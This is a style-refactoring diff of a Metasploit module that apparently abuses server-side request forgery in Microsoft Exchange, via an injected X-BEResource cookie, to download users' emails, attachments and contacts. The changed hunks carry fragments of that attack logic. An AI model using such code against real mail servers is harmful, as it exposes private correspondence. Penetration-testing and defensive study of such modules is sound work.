@@ -43,13 +43,17 @@ class MetasploitModule < Msf::Auxiliary
           'SSL' => true
         },
         'Actions' => [
-          ['Dump (Contacts)', {
-            'Description' => 'Dump user contacts from exchange server',
-            'id_attribute' => 'contacts'
-          }],
-          ['Dump (Emails)', {
-            'Description' => 'Dump user emails from exchange server'
-          }]
+          [
+            'Dump (Contacts)', {
+              'Description' => 'Dump user contacts from exchange server',
+              'id_attribute' => 'contacts'
+            }
+          ],
+          [
+            'Dump (Emails)', {
+              'Description' => 'Dump user emails from exchange server'
+            }
+          ]
         ],
         'DefaultAction' => 'Dump (Emails)',
         'Notes' => {
@@ -133,7 +137,7 @@ class MetasploitModule < Msf::Auxiliary
     response = send_xml(soap_listattachments(item_id), ssrf)
     xml = Nokogiri::XML.parse(response.body)
 
-    xml.xpath("//t:Message/t:Attachments/t:FileAttachment", XMLNS).each do|item|
+    xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).each do |item|
       item_id = item.at_xpath('./t:AttachmentId', XMLNS).values[0]
 
       response = send_xml(soap_downattachment(item_id), ssrf)
@@ -152,8 +156,8 @@ class MetasploitModule < Msf::Auxiliary
     response = send_xml(soap_listitems(datastore['FOLDER'], total_count), ssrf)
     xml = Nokogiri::XML.parse(response.body)
 
-    xml.xpath("//t:Items/t:Message", XMLNS).each do|item|
-      item_info = item.at_xpath("./t:ItemId", XMLNS).values
+    xml.xpath('//t:Items/t:Message', XMLNS).each do |item|
+      item_info = item.at_xpath('./t:ItemId', XMLNS).values
       print_status(" * download item: #{item_info[1]}")
 
       response = send_xml(soap_downitem(item_info[0], item_info[1]), ssrf)
@@ -185,19 +189,19 @@ class MetasploitModule < Msf::Auxiliary
 
     server = ''
     owa_urls = []
-    xml.xpath("//xmlns:Account/xmlns:Protocol", xmlns).each do|item|
+    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|
       type = item.at_xpath('./xmlns:Type', xmlns).content
       if type == 'EXCH'
-        server = item.at_xpath("./xmlns:Server", xmlns).content
+        server = item.at_xpath('./xmlns:Server', xmlns).content
       end
 
-      if type == 'WEB'
-        item.xpath("./xmlns:Internal/xmlns:OWAUrl", xmlns).each do|owa_url|
-          owa_urls << owa_url.content
-        end
+      next unless type == 'WEB'
+
+      item.xpath('./xmlns:Internal/xmlns:OWAUrl', xmlns).each do |owa_url|
+        owa_urls << owa_url.content
       end
     end
-    fail_with(Failure::Unknown, 'No \'OWAUrl\' was found') unless owa_urls.length > 0
+    fail_with(Failure::Unknown, 'No \'OWAUrl\' was found') if owa_urls.empty?
 
     return([server, legacy_dn, owa_urls])
   end
@@ -209,7 +213,7 @@ class MetasploitModule < Msf::Auxiliary
       'cookie' => "X-BEResource=#{ssrf};",
       'ctype' => ctype
     }
-    request = request.merge({'data' => data}) unless data.empty?
+    request = request.merge({ 'data' => data }) unless data.empty?
 
     received = send_request_cgi(request)
     fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
@@ -392,11 +396,11 @@ class MetasploitModule < Msf::Auxiliary
       target = ''
       discover_info[2].each do |url|
         host = url.split('://')[1].split('.')[0].downcase
-        if host != server_name.downcase
-          target = host
+        next unless host != server_name.downcase
 
-          break
-        end
+        target = host
+
+        break
       end
       fail_with(Failure::Unknown, 'No internal target was found') if target.empty?
 
